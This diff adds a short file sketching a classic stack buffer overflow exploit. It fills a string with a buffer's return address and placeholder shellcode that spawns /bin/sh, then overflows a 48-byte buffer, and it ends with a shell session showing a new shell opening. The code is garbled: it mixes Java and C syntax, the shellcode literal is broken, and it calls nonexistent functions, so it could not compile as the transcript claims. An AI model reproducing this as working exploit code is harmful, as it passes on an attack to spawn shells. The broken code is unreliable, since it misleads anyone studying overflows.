@@ -1,0 +1,21 @@
+class OverflowAttack{
+ char shellcode[]="/xec/xff..."/bin/sh;//code which the attacker wants to execute as Array containing the exploit
+ char largeString[128];
+ public static void main(String[] args){
+ char buffer[48];//Shot String as locally defined array, created on to the stack
+ int i;
+ long longptr=(long) largeString;
+ for(i=0;i<32;i++){//128/4=32
+  longptr[i]=(int) buffer;//Fill the large String with the adress of the buffer
+ }
+ for(i=0;i<strlength(shellcode);i++){
+  largeString[i]=shellcode[i];//Copy the shellcode/exploit on to the large String-> String is now filled with exploit on 1.place followed by buffer return adress of 1. overflow adress
+ }
+ stringcopy(buffer, largeString);//Copying largeString into buffer, results in buffer overflow and executing shellcode/exploit
+}
+}
+
+//Execution in shell:
+bash$ gcc overflow1.c
+bash$ ./a.out
+$sh //Create new Shell
